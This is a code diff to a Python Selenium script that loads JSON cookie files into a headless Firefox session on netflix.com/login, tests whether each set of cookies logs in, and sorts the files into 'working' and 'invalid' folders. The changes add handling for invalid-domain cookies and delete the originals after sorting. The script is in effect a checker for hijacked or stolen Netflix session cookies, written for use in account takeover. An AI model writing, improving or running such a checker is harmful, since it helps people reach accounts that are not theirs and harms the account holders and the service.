@@ -1,31 +1,22 @@
-import json
 import os
-import tkinter
-from tkinter import filedialog
-import config
+import json
+
 from selenium import webdriver
+from selenium.common.exceptions import *
 from selenium.webdriver.common.by import By
 from selenium.webdriver.firefox.options import Options
 
+
+cookies_path = "json_cookies"
 working_cookies_path = "working_cookies"
+invalid_cookies_path = "invalid_cookies"
 
-if config.use_folder_selector:
-    tkinter.Tk().withdraw()
-    folder_path = filedialog.askdirectory()
-    if folder_path == "":
-        folder_path = "json_cookies"
-        print("Using default path")
-    else:
-        print(f"Using path: {folder_path}")
-
-
-def load_cookies_from_json(FILEPATH):
+def load_cookies_from_json(FILEPATH: str):
     with open(FILEPATH, "r", encoding="utf-8") as cookie_file:
         cookie = json.load(cookie_file)
     return cookie
 
-
-def open_webpage_with_cookies(URL, COOKIES):
+def open_webpage_with_cookies(URL: str, COOKIES: dict):
     firefox_options = Options()
     firefox_options.add_argument("start-maximized")
     firefox_options.add_argument("--headless")
@@ -38,32 +29,46 @@ def open_webpage_with_cookies(URL, COOKIES):
     driver.refresh()
 
     if driver.find_elements(By.CSS_SELECTOR, ".btn"):
-        print(f"Cookie Not working - {filename}")
+        print(f"❌ Expired cookies! - {filename}")
         driver.quit()
     else:
-        print(f"Working cookie found! - {filename}")
+        print(f"✅ Working cookies! - {filename}")
+        
         try:
             os.mkdir(working_cookies_path)
-            with open(f"working_cookies/{filename})", "w", encoding="utf-8") as a:
-                a.write(content)
-            driver.quit()
-
         except FileExistsError:
-            with open(f"working_cookies/{filename}", "w", encoding="utf-8") as a:
-                a.write(content)
-            driver.quit()
+            pass
+        
+        new_filepath = os.path.join(working_cookies_path, filename)
+        with open(new_filepath, "w", encoding="utf-8") as c:
+            c.write(content)
+        
+        driver.quit()
+        os.remove(filepath)
 
 
-for filename in os.listdir("json_cookies"):
-    filepath = os.path.join("json_cookies", filename)
+for filename in os.listdir(cookies_path):
+    filepath = os.path.join(cookies_path, filename)
     if os.path.isfile(filepath):
         with open(filepath, "r", encoding="utf-8") as file:
             content = file.read()
-
             url = "https://netflix.com/login"
 
             try:
                 cookies = load_cookies_from_json(filepath)
                 open_webpage_with_cookies(url, cookies)
+            except InvalidCookieDomainException:
+                print(f"🚫 Invalid cookies! - {filename}")
+                
+                try:
+                    os.mkdir(invalid_cookies_path)
+                except FileExistsError:
+                    pass
+
+                new_filepath = os.path.join(invalid_cookies_path, filename)
+                with open(new_filepath, "w", encoding="utf-8") as c:
+                    c.write(content)
+
+                os.remove(filepath)
             except Exception as e:
-                print(f"Error occurred: {str(e)} - {filename}")
+                print(f"⚠️ ERROR! - {filename} - {str(e)}")
